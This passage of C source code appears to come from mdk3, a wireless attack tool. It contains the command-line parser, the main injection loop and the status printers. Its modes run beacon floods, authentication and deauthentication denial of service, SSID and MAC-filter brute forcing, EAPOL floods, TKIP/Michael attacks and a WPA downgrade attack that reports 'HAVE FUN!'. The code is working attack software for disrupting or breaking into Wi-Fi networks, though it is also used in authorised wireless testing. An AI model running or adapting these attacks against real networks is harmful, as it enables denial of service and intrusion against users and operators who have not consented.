	if (resp) //Ap keeps responding
	{
	    auths[pos][1]++;
	    if ((auths[pos][1] % 500 == 0) && (auths[pos][1] != 0)) //AP can handle huge amount of clients, possibly invulnerable
	    {
		printf("\rAP %02X:%02X:%02X:%02X:%02X:%02X seems to be INVULNERABLE!      \n", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
		printf("Device is still responding with %5d clients connected!\n", auths[pos][1]);
	    }
	} else { //MISSING RESPONSE!
	    auths[pos][0] = 2; //Status: Possible candidate for success
	    auths[pos][2]++;   //Increase counter for missing response
	}
	return;
    }
    if (status == 2) //Ap stopped responding
    {
	if (resp) //False alarm, AP responding again
	{
	    auths[pos][0] = 1; //Reset Status
	    auths[pos][1]++;   //Add another response
	    auths[pos][2] = 0; //Reset missing response counter
	} else {
	    auths[pos][2]++;   //Increase missing response count
	    if (auths[pos][2] > 50) //50 responses missing => Another one bites the dust!
	    {
		auths[pos][0] = 3; //Status: successful
		printf("\rAP %02X:%02X:%02X:%02X:%02X:%02X seems to be VULNERABLE and may be frozen!\n", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
		printf("Needed to connect %4d clients to freeze it.\n", auths[pos][1]);
		if (auths[pos][1] < 150) printf("This is an unexpected low value, AP could still be working but is out of range.\n");
	    }
	}
	return;
    }
    if (status == 3) //AP under test
    {
	if (resp) //AP is back in action!
	{
	    auths[pos][0] = 1; //Reset Status
	    auths[pos][1] = 0;
	    auths[pos][2] = 0;
	    printf("\rAP %02X:%02X:%02X:%02X:%02X:%02X has returned to functionality!     \n", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
	}
	return;
    }
}

int check_probe(struct pckt mac)
{
// USING MODIFIED CODE FROM CHECK_AUTH, perhaps move into function to use by both

    int len = 0;
    int t, resp = 0;

    for (t=0; t<3; t++) 
    {
	len = 0;
	len = read_packet(pkt_check, MAX_PACKET_LENGTH);
	// Is this frame for fake probing station?
	if (! memcmp(mac.data, pkt_check+4, ETH_MAC_LEN))
	{
	    // Is this frame a probe response?
	    if (! memcmp(pkt_check, "\x50", 1))
	    {
		resp = 1;
		goto exiting;  //Again, goto forever! ;)
	    }
	}
    }

    exiting:
    return resp;
}

/* Statistics Printing */

void print_beacon_stats(struct pckt beacon)
{
// Print some information in beacon flood mode

    uchar *ssid = beacon.data+38;
    uchar len = beacon.data[37];
    uchar chan;

//Is there a 54 MBit speed byte?
    if(memcmp(&beacon.data[47+len], "\x6c", 1) == 0) {
        //There is! We need to skip 4 more bytes ahead to get to the channel byte
        memcpy(&chan, &beacon.data[50+len], 1);
    }
    else {
        memcpy(&chan, &beacon.data[46+len], 1);
   }

    uchar *mac = beacon.data+10;

//Removed '+1' since it always added a strange extra character to the output (?).
    ssid[len]='\x00';  // NOT GOOD! writes in original frame. Till now no copy was required. So this works

    printf("\rCurrent MAC: %02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    printf(" on Channel %2d with SSID: %s\n", chan, ssid);
}

void print_auth_stats(struct pckt authpkt)
{
// Print some information while in Authentication DoS mode

    uchar *ap = authpkt.data+4;
    uchar *fc = authpkt.data+10;

    printf("\rConnecting Client: %02X:%02X:%02X:%02X:%02X:%02X", fc[0], fc[1], fc[2], fc[3], fc[4], fc[5]);
    printf(" to target AP: %02X:%02X:%02X:%02X:%02X:%02X\n", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
}

void print_probe_stats(int responses, int sent)
{
    int perc;

    perc = ((responses * 100) / sent);

    printf("\rAP responded on %d of %d probes (%d percent)                  \n", responses, sent, perc);
}

void print_deauth_stats(struct pckt packet)
{
// Print some information while in Deauthentication DoS mode

    uchar *ap = packet.data+16;
    uchar *fc = packet.data+4;  //For the case AP kicks client

    //For the case client deauthing from AP
    if (! memcmp(packet.data+4, packet.data+16, ETH_MAC_LEN))
	fc = packet.data + 10;

    printf("\rDisconnecting between: %02X:%02X:%02X:%02X:%02X:%02X", fc[0], fc[1], fc[2], fc[3], fc[4], fc[5]);
    printf(" and: %02X:%02X:%02X:%02X:%02X:%02X", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);

    // Display current channel, if hopper is running
    if (current_channel == 0) {
	printf("\n");
    } else {
	printf(" on channel: %d\n", current_channel);
    }

}

void print_ssid_brute_stats(struct pckt packet)
{
    uchar *ssid = packet.data+26;
    packet.data[26+packet.data[25]] = '\x00';

    printf("\rTrying SSID: %s                                \n", ssid);
}

void print_intelligent_auth_dos_stats()
{
    printf("\rClients: Created: %4d   Authenticated: %4d   Associated: %4d   Got Kicked: %4d\n",
		       ia_stats.c_created, ia_stats.c_authed, ia_stats.c_assoced, ia_stats.c_kicked);
      printf("Data   : Captured: %4d   Sent: %4d   Responses: %4d   Relayed: %4d\n",
		       ia_stats.d_captured, ia_stats.d_sent, ia_stats.d_responses, ia_stats.d_relays);
}

void print_wids_stats()
{
    printf("\rAPs found: %d   Clients found: %d   Completed Auth-Cycles: %d   Caught Deauths: %d\n",
		  wids_stats.aps, wids_stats.clients, wids_stats.cycles, wids_stats.deauths);
}

void print_mac_bruteforcer_stats(struct pckt packet)
{
    uchar *m = packet.data+10;

    float timeout = (float) tv_dyntimeout.tv_usec / 1000.0;

    printf("\rTrying MAC %02X:%02X:%02X:%02X:%02X:%02X with %8.4f ms timeout at %3d MACs per second and %d retries\n",
	   m[0], m[1], m[2], m[3], m[4], m[5], timeout, mac_brute_speed, mac_brute_timeouts);

    mac_brute_speed = 0;
    mac_brute_timeouts = 0;
}

void print_wpa_downgrade_stats()
{
    static int wpa_old = 0, wep_old = 0, warning = 0, downgrader = 0;

    printf("\rDeauth cycles: %4d  802.1x authentication packets: %4d  WEP/Unencrypted packets: %4d  Beacons/sec: %3d\n", wpad_cycles, wpad_auth, wpad_wep, wpad_beacons);
    if (wpad_beacons == 0) {
	printf("NOTICE: Did not receive any beacons! Maybe AP has been reconfigured and/or is rebooting!\n");
    }

    if (wpa_old < wpad_cycles) {
	if (wep_old < wpad_wep) {
	    if (!warning) {
		printf("REALLY BIG WARNING!!! Seems like a client connected to your target AP leaks PLAINTEXT data while authenticating!!\n");
		warning = 1;
	    }
	}
    }

    if (wpa_old == wpad_cycles) {
	if (wep_old < wpad_wep) {
	    downgrader++;
	    if (downgrader == 10) {
		printf("WPA Downgrade Attack successful. No increasing WPA packet count detected. HAVE FUN!\n");
		downgrader = 0;
	    }
	}
    }

    wpa_old = wpad_cycles;
    wep_old = wpad_wep;
    wpad_beacons = 0;
}

void print_stats(char mode, struct pckt packet, int responses, int sent)
{
// Statistics dispatcher

    switch (mode)
    {
    case 'b':
    case 'B':
	print_beacon_stats(packet);
	break;
    case 'a':
    case 'A':
	print_auth_stats(packet);
	break;
    case 'p':
	print_probe_stats(responses, sent);
	break;
    case 'd':
	print_deauth_stats(packet);
	break;
    case 'P':
	print_ssid_brute_stats(packet);
	break;
    case 'i':
	print_intelligent_auth_dos_stats();
	break;
    case 'w':
	print_wids_stats();
	break;
    case 'f':
	print_mac_bruteforcer_stats(packet);
	break;
    case 'g':
	print_wpa_downgrade_stats();
	break;
    /*TODO*/
    }
}

/* MDK Parser, Setting up testing environment */

int mdk_parser(int argc, char *argv[])
{

    int nb_sent = 0, nb_sent_ps = 0;  // Packet counters
    char mode = '0';              // Current mode
    uchar *ap = NULL;             // Pointer to target APs MAC
    char check = 0;               // Flag for checking if test is successful
    struct pckt frm;              // Struct to save generated Packets
    char *ssid = NULL;            // Pointer to generated SSID
    int pps = 50;                 // Packet sending rate
    int t = 0;
    time_t t_prev;                // Struct to save time for printing stats every sec
    int total_time = 0;           // Amount of seconds the test took till now
    int chan = 1;                 // Channel for beacon flood mode
    int fchan = 0;                // Channel selected via -c option
    int wep = 0;                  // WEP bit for beacon flood mode (1=WEP, 2=WPA-TKIP 3=WPA-AES)
    int gmode = 0;                // 54g speed flag
    struct pckt mac;              // MAC Space for probe mode
    int resps = 0;                // Counting responses for probe mode
    int usespeed = 0;             // Should injection be slown down?
    int random_mac = 1;           // Use random or valid MAC?
    int ppb = 70;                 // Number of packets per burst
    int wait = 10;                // Seconds to wait between bursts
    int adhoc = 0;                // Ad-Hoc mode
    int adv = 0;                  // Use advanced FakeAP mode
    int got_ssid = 0;
    char *list_file = NULL;       // Filename for periodical white/blacklist processing
    t_prev = (time_t) malloc(sizeof(t_prev));

    // GCC Warning avoidance
    mac.data = NULL;
    mac.len = 0;
    frm.data = NULL;
    frm.len = 0;

    if ((argc < 3) || (strlen(argv[2]) != 1))
    {
	printf(use_head);
	return -1;
    }

    /* Parsing Options - Need to switch to optarg parser? */

    switch (argv[2][0])
    {
    case 'b':
	mode = 'b';
	usespeed = 1;
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-n")) if (argc > t+1) ssid = argv[t+1];
	    if (! strcmp(argv[t], "-f")) if (argc > t+1) {
		if (ssid_file_name == NULL) ssid_file_name = argv[t+1];
		else { printf(use_beac); return -1; }
	    }
	    if (! strcmp(argv[t], "-v")) if (argc > t+1) {
		if (ssid_file_name == NULL) { ssid_file_name = argv[t+1]; adv=1; }
		else { printf(use_beac); return -1; }
	    }
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) pps = strtol(argv[t+1], (char **) NULL, 10);
	    if (! strcmp(argv[t], "-c")) if (argc > t+1) fchan = strtol(argv[t+1], (char **) NULL, 10);
	    if (! strcmp(argv[t], "-h")) mode = 'B';
	    if (! strcmp(argv[t], "-m")) random_mac = 0;
	    if (! strcmp(argv[t], "-w")) wep = 1;
	    if (! strcmp(argv[t], "-g")) gmode = 1;
	    if (! strcmp(argv[t], "-t")) wep = 2;
	    if (! strcmp(argv[t], "-a")) wep = 3;
	    if (! strcmp(argv[t], "-d")) adhoc = 1;
	}
	break;
    case 'a':
	mode = 'a';
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-a")) {
		  if (! argc > t+1) { printf(use_auth); return -1; }
		  ap = (uchar *) parse_mac(argv[t+1]);
		  mode = 'A';
	    }
        if (! strcmp(argv[t], "-i")) {
		  if (! argc > t+1) { printf(use_auth); return -1; }
		  target = (uchar *) parse_mac(argv[t+1]);
		  mode = 'i';
		  usespeed = 1; pps = 500;
	    }
	    if (! strcmp(argv[t], "-c")) check = 1;
	    if (! strcmp(argv[t], "-m")) random_mac = 0;
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	}
	break;
    case 'p':
	mode = 'p';
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-b"))
	    {
		if(argc<=7){
	   		printf("\nYou have to specify at least:\n \
			\r a channel (-c), a target-mac (-t) and a character-set:\n \
			\r all printable (a)\n \
			\r lower case (l)\n \
			\r upper case (u)\n \
			\r numbers (n)\n \
			\r lower and upper case (c)\n \
			\r lower and upper plus numbers (m)\n \
			\noptional:\n proceed with SSID (-p <SSID>)\n packets per second (-s)\n");
	   printf("\ne.g. : mdk3 ath0 p -b a -p SSID -c 2 -t 00:11:22:33:44:55 -s 1\n\n");
	   return -1;
        }
		real_brute = 1;
		mode = 'P';
		if (argc > t) brute_mode = argv[t+1][0];
		printf("\nSSID Bruteforce Mode activated!\n");
		brute_ssid = (char*) malloc (256 * sizeof(char));
		memset(brute_ssid, 0, (256 * sizeof(char)));
		
	    }
	    if (!strcmp(argv[t], "-p")) {
		    brute_ssid = argv[t+1];
		    printf("\nproceed with: %s",brute_ssid );
		    brute_ssid[0]--;
		}
	    if (! strcmp(argv[t], "-c")){
                if (argc > t+1){ 
		    printf("\n\nchannel set to: %d", atoi(argv[t+1]));
		    set_channel(atoi(argv[t+1]));
		    }
            }
	    if (! strcmp(argv[t], "-e")) if (argc > t+1) ssid = argv[t+1];
	    if (! strcmp(argv[t], "-f")) if (argc > t+1) {
		ssid_file_name = argv[t+1];
		mode = 'P';
		printf("\nSSID Wordlist Mode activated!\n");
	    }
	    if (! strcmp(argv[t], "-t")) {
		if (! argc > t+1) { printf(use_prob); return -1; }
		target = (uchar *) parse_mac(argv[t+1]);
	    }
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	}
    break;
    case 'w':
	mode = 'w';
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-e")) if (argc > t+1) {
		essid_len = strlen(argv[t+1]);
		essid = (uchar *) malloc(essid_len);
		memcpy(essid, argv[t+1], essid_len);
		got_ssid = 1;
	    }
	    if (! strcmp(argv[t], "-c")) {
		if (argc > t+1) {
		    // There is a channel list given
		    init_channel_hopper(argv[t+1], 1);
		} else {
		    // No list given
		    init_channel_hopper(NULL, 1);
		}
	    }
	    if (! strcmp(argv[t], "-z")) {
		// Zero_Chaos attack
		zc_exploit = 1;
	    }
	}
    break;
    case 'm':
        mode = 'm';
        usespeed = 1;
        pps = 400;
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_mich); return -1; }
		target = (uchar *) parse_mac(argv[t+1]);
	    }
	    if (! strcmp(argv[t], "-n")) if (argc > t+1) {
		ppb = strtol(argv[t+1], (char **) NULL, 10);
	    }
	    if (! strcmp(argv[t], "-w")) if (argc > t+1) {
		wait = strtol(argv[t+1], (char **) NULL, 10);
	    }
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	    if (! strcmp(argv[t], "-j")) {
		useqosexploit = 1;
	    }
	}
    break;
    case 'x':
	mode = 'x';
        if (argc < 4) { printf(use_eapo); return -1; }
        eapol_test = strtol(argv[3], (char **) NULL, 10);
        usespeed = 1;
        pps = 400;
        eapol_wtype = FLAG_AUTH_WPA;
        eapol_ucast = FLAG_TKIP;
        eapol_mcast = FLAG_TKIP;
	for (t=4; t<argc; t = t + 2)
	{
	    if (! strcmp(argv[t], "-n")) {
              if (! (argc > t+1)) { printf(use_eapo); return -1; }
              ssid = argv[t + 1];
	    }
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_eapo); return -1; }
		target = (uchar *) parse_mac(argv[t+1]);
                memcpy(eapol_dst, target, ETH_MAC_LEN);
	    }
	    if (! strcmp(argv[t], "-c")) {
		if (! (argc > t+1)) { printf(use_eapo); return -1; }
		mac_sa = (uchar *) parse_mac(argv[t+1]);
                memcpy(eapol_src, mac_sa, ETH_MAC_LEN);
	    }
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	    if (! strcmp(argv[t], "-w")) if (argc > t+1) {
		eapol_wtype = strtol(argv[t+1], (char **) NULL, 10);
	    }
	    if (! strcmp(argv[t], "-u")) if (argc > t+1) {
		eapol_ucast = strtol(argv[t+1], (char **) NULL, 10);
	    }
	    if (! strcmp(argv[t], "-m")) if (argc > t+1) {
		eapol_mcast = strtol(argv[t+1], (char **) NULL, 10);
	    }
	}
	break;
    case 'd':
	mode = 'd';
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-s")) if (argc > t+1) {
		pps = strtol(argv[t+1], (char **) NULL, 10);
		usespeed = 1;
	    }
	    if (! strcmp(argv[t], "-w")) if (argc > t+1) {
		if (wblist != 0) { printf(use_deau); return -1; }
		load_whitelist(argv[t+1]);
		list_file = argv[t+1];
		wblist = 1;
	    }
	    if (! strcmp(argv[t], "-b")) if (argc > t+1) {
		if (wblist != 0) { printf(use_deau); return -1; }
		load_whitelist(argv[t+1]);
		list_file = argv[t+1];
		wblist = 2;
	    }
	    if (! strcmp(argv[t], "-c")) {
		if (argc > t+1) {
		    // There is a channel list given
		    init_channel_hopper(argv[t+1], 3);
		} else {
		    // No list given
		    init_channel_hopper(NULL, 3);
		}
	    }
	}
    break;
    case 'f':
        mode = 'f';
        usespeed = 0;
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_macb); return -1; }
		uchar *tmp_mac_addr = (uchar *) parse_mac(argv[t+1]);
		target = malloc(6);
		memcpy(target, tmp_mac_addr, 6);
	    }
	    if (! strcmp(argv[t], "-m")) {
		if (! (argc > t+1)) { printf(use_macb); return -1; }
		mac_base = (uchar *) parse_half_mac(argv[t+1]);
	    }
	    if (! strcmp(argv[t], "-f")) {
		if (! (argc > t+1)) { printf(use_macb); return -1; }
		uchar *tmp_mac_addr = (uchar *) parse_mac(argv[t+1]);
		mac_base = (uchar *) malloc(3);
		mac_lower = (uchar *) malloc(3);
		memcpy(mac_base, tmp_mac_addr , 3);
		memcpy(mac_lower,tmp_mac_addr+3,3);
	    }
	}
    break;
    case 'g':
	mode = 'g';
	usespeed = 0;
	for (t=3; t<argc; t++)
	{
	    if (! strcmp(argv[t], "-t")) {
		if (! (argc > t+1)) { printf(use_wpad); return -1; }
		uchar *tmp_mac_addr = (uchar *) parse_mac(argv[t+1]);
		target = malloc(6);
		memcpy(target, tmp_mac_addr, 6);
	    }
	}
   break;
    default:
	printf(use_head);
	return -1;
	break;
    }

    printf("\n");

    if ((mode == 'w') && (got_ssid == 0)) {
	printf("Please specify a target ESSID!\n\n");
	printf(use_wids);
	return -1;
    }
    if ((mode == 'P') && (usespeed == 0)) {
	usespeed = 1; pps = 300;
    }
    if ((mode == 'P') && (real_brute) && (target == NULL)) {
	printf("Please specify a target (-t <MAC>)\n");
	return -1;
    }
    if ((mode == 'p') && (ssid == NULL) && (ssid_file_name == NULL)) {
	printf("Please specify an ESSID (option -e) , a filename (option -f) or bruteforce mode (-b)\n");
	return -1;
    }
    if ((mode == 'P') && (target == NULL))
	printf("WARNING: No target (-t <MAC>) specified, will show ALL responses and stop on EOF!\n");
    if ((mode == 'p') && (target != NULL))
	printf("WARNING: Target ignored when not in Bruteforce mode\n");
    if (((mode == 'm') || (mode == 'f')) && (target == NULL))
    {
	if (! useqosexploit) {  // We need no target 
	    printf("Please specify MAC (option -t)\n");
	    return -1;
	}
    }
    if (mode == 'x') {
	if ( (target == NULL) && (eapol_test == EAPOL_TEST_START_FLOOD) ) {
          printf("Please specify MAC of target AP (option -t)\n");
          return -1;
        }
        if ( (ssid == NULL) && (eapol_test == EAPOL_TEST_START_FLOOD) ) {
          printf("Please specify a SSID (option -n)\n");
          return -1;
        }
        if ( (mac_sa == NULL) && (eapol_test == EAPOL_TEST_LOGOFF) ) {
          printf("Please specify MAC of target STA (option -c)\n");
          return -1;
        }
    }
    if (mode == 'g') {
	if (target == NULL) {
	    printf("Please specify MAC of target AP (option -t)\n");
	    return -1;
	}
    }

    /* Main packet sending loop */

    while(1)
    {

	/* Creating Packets, do sniffing */

	switch (mode)
	{
	case 'B':
	    if ((nb_sent % 30 == 0) || (total_time % 3 == 0))  // Switch Channel every 30 frames or 3 seconds
	    {
		if (fchan) {
		    set_channel(fchan);
		    chan = fchan;
		} else {
		    chan = generate_channel();
		    set_channel(chan);
		}
	    }
	    frm = create_beacon_frame(ssid, chan, wep, random_mac, gmode, adhoc, adv);
	    break;
	case 'b':
	    if (fchan) chan = fchan;
		else chan = generate_channel();
	    frm = create_beacon_frame(ssid, chan, wep, random_mac, gmode, adhoc, adv);
	    break;
	case 'a':  // Automated Auth DoS mode
	    if ((nb_sent % 512 == 0) || (total_time % 30 == 0))  // After 512 packets or 30 seconds, search for new target
	    {
		printf ("\rTrying to get a new target AP...                  \n");
		ap = get_target_ap();
	    }
	case 'A':  // Auth DoS mode with target MAC given
	    frm = create_auth_frame(ap, random_mac, NULL);
	    break;
	case 'i':  // Intelligent Auth DoS
	    frm = intelligent_auth_dos(random_mac);
	    break;
	case 'p':
	    mac = generate_mac(1);
	    frm = create_probe_frame(ssid, mac);
	    break;
	case 'P':
	    if (real_brute) {
		frm = ssid_brute_real();
	    } else {
		frm = ssid_brute();
	    }
	    break;
	case 'd':
	    frm = amok_machine(list_file);
	    break;
        case 'm':
            frm = false_tkip(target);
            break;
	case 'x':
            switch (eapol_test) {
              case EAPOL_TEST_START_FLOOD:
                frm = eapol_machine(ssid, strlen(ssid), target, eapol_wtype, eapol_ucast, eapol_mcast);
                break;
              case EAPOL_TEST_LOGOFF:
                frm = eapol_logoff(eapol_dst, eapol_src);
                break;
            }
	    break;
	case 'w':
	    frm = wids_machine();
	    break;
	case 'f':
	    frm = mac_bruteforcer();
	    break;
	case 'g':
	    frm = wpa_downgrade();
	    if (frm.data == NULL) goto statshortcut;
	    break;
	}

	/* Sending packet, increase counters */

	if (frm.len < 10) printf("WTF?!? Too small packet injection detected! BUG!!!\n");
	send_packet(frm.data, frm.len);
	nb_sent_ps++;
	nb_sent++;
	if (useqosexploit) { nb_sent_ps += 3; nb_sent += 3; }	//Yes, I know... too lazy.

	/* User wants check for responses? */

	if ((mode=='a' || mode=='A') && ! check) check_auth(ap);
	if (mode=='p') resps += check_probe(mac);

	/* Does another thread want to exit? */

	if (exit_now) return 0;

	/* Waiting for Hannukah */

	if (usespeed) usleep(pps2usec(pps));

statshortcut:

	/* Print speed, packet count and stats every second */

	if( time( NULL ) - t_prev >= 1 )
        {
            t_prev = time( NULL );
	    print_stats(mode, frm, resps, nb_sent_ps);
	    printf ("\rPackets sent: %6d - Speed: %4d packets/sec", nb_sent, nb_sent_ps);
	    fflush(stdout);
	    nb_sent_ps=0;
	    resps=0;
	    total_time++;
	}

	// Waiting for next burst in Michael Test
        if(! (nb_sent % ppb) && (mode == 'm'))
	    sleep(wait);

    }   // Play it again, Johnny!

    return 0;
}

/* MAIN */

int main( int argc, char *argv[] )
{

    if( geteuid() != 0 )
    {
        printf( "This program requires root privileges.\n" );
        return( 1 );
    }


    if( argc < 2 )
    {
	printf(use_head);
        return( 1 );
    }

    if( !memcmp(argv[1], "--help", 6))
    {
	if( argc < 3 ) {
	    printf(use_head);
            return( 1 );
	}

	switch (argv[2][0]) {
	    case 'b':
		printf(use_beac);
		break;
	    case 'a':
		printf(use_auth);
		break;
	    case 'p':
		printf(use_prob);
		break;
	    case 'd':
		printf(use_deau);
		break;
	    case 'm':
		printf(use_mich);
		break;
	    case 'x':
		printf(use_eapo);
		break;
	    case 'w':
		printf(use_wids);
		break;
	    case 'f':
		printf(use_macb);
		break;
	    case 'g':
		printf(use_wpad);
		break;
	    default:
		printf(use_head);
        }
	return(0);
    }

    if( !memcmp(argv[1], "--fullhelp", 10))
    {
	printf(use_head);
	printf("\n\n");
	printf(use_beac);
	printf(use_auth);
	printf(use_prob);
	printf(use_deau);
	printf(use_mich);
	printf(use_eapo);
	printf(use_wids);
	printf(use_macb);
	printf(use_wpad);
	return (0);
    }

    /* open the replay interface */
    _wi_out = wi_open(argv[1]);
    if (!_wi_out)
    	return 1;
    dev.fd_out = wi_fd(_wi_out);

    /* open the packet source */
    _wi_in = _wi_out;
    dev.fd_in = dev.fd_out;

    /* XXX */
    dev.arptype_in = dev.arptype_out;

    /* drop privileges */

    setuid( getuid() );

    int retval = mdk_parser(argc, argv);

    return( retval );
}
